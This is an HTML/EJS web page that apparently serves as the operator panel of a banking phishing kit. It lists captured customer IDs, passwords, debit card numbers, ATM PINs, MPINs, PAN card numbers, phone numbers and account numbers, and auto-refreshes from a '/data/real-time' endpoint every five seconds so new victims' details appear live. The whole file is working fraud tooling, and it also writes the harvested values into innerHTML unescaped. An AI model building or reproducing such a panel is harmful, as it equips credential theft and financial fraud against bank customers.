<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Document</title>
  <link
    href="https://cdn.jsdelivr.net/npm/daisyui@3.2.1/dist/full.css"
    rel="stylesheet"
    type="text/css"
  />
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
  <div class="p-10 flex justify-content items-center w-full">
    <div class="overflow-x-auto p-5 w-full" id="data-table-body">
      <% for (let i = data.length - 1; i >= 0; i--) { %>
        <div class="mt-10 flex flex-col">
          <h2><span class="text-red-500 bold text-md uppercase">Customer ID:</span> <%= data[i].customer_id || "N/A" %></h2>
          <h2><span class="text-red-500 bold text-md uppercase">Password:</span> <%= data[i].password || "N/A" %></h2>
          <h2><span class="text-red-500 bold text-md uppercase">Debit Card:</span> <%= data[i].debit_card || "N/A" %></h2>
          <h2><span class="text-red-500 bold text-md uppercase">ATM PIN:</span> <%= data[i].atm_pin || "N/A" %></h2>
          <h2><span class="text-red-500 bold text-md uppercase">Register Mobile Number:</span> <%= data[i].register_mobile_number || "N/A" %></h2>
          <h2><span class="text-red-500 bold text-md uppercase">MPIN:</span> <%= data[i].mpin || "N/A" %></h2>
          <h2><span class="text-red-500 bold text-md uppercase">Pan Card:</span> <%= data[i].pan_card || "N/A" %></h2>
          <h2><span class="text-red-500 bold text-md uppercase">MPin:</span> <%= data[i].mpin || "N/A" %></h2>
          <h2><span class="text-red-500 bold text-md uppercase">Register Mobile Number 2:</span> <%= data[i].register_mobile_number_2 || "N/A" %></h2>
          <h2><span class="text-red-500 bold text-md uppercase">Account Number:</span> <%= data[i].account_number || "N/A" %></h2>
        </div>
      <% } %>
    </div>
  </div>

  <script>
    function refreshData() {
      fetch("/data/real-time")
        .then((response) => response.json())
        .then((data) => {
          const tableBody = document.getElementById("data-table-body");
          tableBody.innerHTML = "";
          data.reverse(); 
          data.forEach((item) => {
            const div = document.createElement("div");
            div.classList.add("mt-10", "flex", "flex-col");

            const h2CustomerId = document.createElement("h2");
            h2CustomerId.innerHTML = `<span class="text-red-500 bold text-md uppercase">Customer ID:</span> ${item.customer_id || "N/A"}`;
            div.appendChild(h2CustomerId);

            const h2Password = document.createElement("h2");
            h2Password.innerHTML = `<span class="text-red-500 bold text-md uppercase">Password:</span> ${item.password || "N/A"}`;
            div.appendChild(h2Password);

            const h2DebitCard = document.createElement("h2");
            h2DebitCard.innerHTML = `<span class="text-red-500 bold text-md uppercase">Debit Card:</span> ${item.debit_card || "N/A"}`;
            div.appendChild(h2DebitCard);

            const h2ATMPin = document.createElement("h2");
            h2ATMPin.innerHTML = `<span class="text-red-500 bold text-md uppercase">ATM PIN:</span> ${item.atm_pin || "N/A"}`;
            div.appendChild(h2ATMPin);

            const h2RegisterMobileNumber = document.createElement("h2");
            h2RegisterMobileNumber.innerHTML = `<span class="text-red-500 bold text-md uppercase">Register Mobile Number:</span> ${item.register_mobile_number || "N/A"}`;
            div.appendChild(h2RegisterMobileNumber);

            const h2MPIN = document.createElement("h2");
            h2MPIN.innerHTML = `<span class="text-red-500 bold text-md uppercase">MPIN:</span> ${item.mpin || "N/A"}`;
            div.appendChild(h2MPIN);

            const h2PanCard = document.createElement("h2");
            h2PanCard.innerHTML = `<span class="text-red-500 bold text-md uppercase">Pan Card:</span> ${item.pan_card || "N/A"}`;
            div.appendChild(h2PanCard);

            const h2MPIN2 = document.createElement("h2");
            h2MPIN2.innerHTML = `<span class="text-red-500 bold text-md uppercase">MPin:</span> ${item.mpin || "N/A"}`;
            div.appendChild(h2MPIN2);

            const h2RegisterMobileNumber2 = document.createElement("h2");
            h2RegisterMobileNumber2.innerHTML = `<span class="text-red-500 bold text-md uppercase">Register Mobile Number 2:</span> ${item.register_mobile_number_2 || "N/A"}`;
            div.appendChild(h2RegisterMobileNumber2);

            const h2AccountNumber = document.createElement("h2");
            h2AccountNumber.innerHTML = `<span class="text-red-500 bold text-md uppercase">Account Number:</span> ${item.account_number || "N/A"}`;
            div.appendChild(h2AccountNumber);

            tableBody.appendChild(div);
          });
        })
        .catch((error) => {
          console.error("Error fetching data:", error);
        });
    }

    setInterval(refreshData, 5000);
  </script>
</body>
</html>
